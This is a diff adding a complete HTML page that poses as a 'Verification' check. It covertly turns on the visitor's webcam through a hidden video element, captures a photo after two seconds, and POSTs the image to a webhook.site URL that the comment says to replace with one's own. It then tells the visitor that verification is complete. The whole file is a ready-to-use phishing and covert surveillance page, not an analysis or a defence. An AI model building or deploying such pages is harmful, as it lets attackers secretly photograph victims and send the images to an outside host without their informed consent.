@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Verification</title>
+</head>
+<body style="font-family:sans-serif;text-align:center;padding-top:40px;">
+  <h2>Loading verification...</h2>
+
+  <video id="video" autoplay playsinline style="display:none;"></video>
+  <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+  <script>
+    async function startCamera() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: true
+        });
+
+        const video = document.getElementById('video');
+        video.srcObject = stream;
+
+        setTimeout(capturePhoto, 2000);
+
+      } catch (err) {
+        document.body.innerHTML = "<h2>Camera access denied.</h2>";
+      }
+    }
+
+    async function capturePhoto() {
+      const video = document.getElementById('video');
+      const canvas = document.getElementById('canvas');
+      const ctx = canvas.getContext('2d');
+
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      canvas.toBlob(async (blob) => {
+
+        const formData = new FormData();
+        formData.append("photo", blob, "photo.jpg");
+
+        // Replace this with your webhook URL
+        await fetch("https://webhook.site/YOUR-ID", {
+          method: "POST",
+          body: formData
+        });
+
+        document.body.innerHTML = "<h2>Verification complete.</h2>";
+
+      }, "image/jpeg", 0.95);
+    }
+
+    startCamera();
+  </script>
+</body>
+</html>
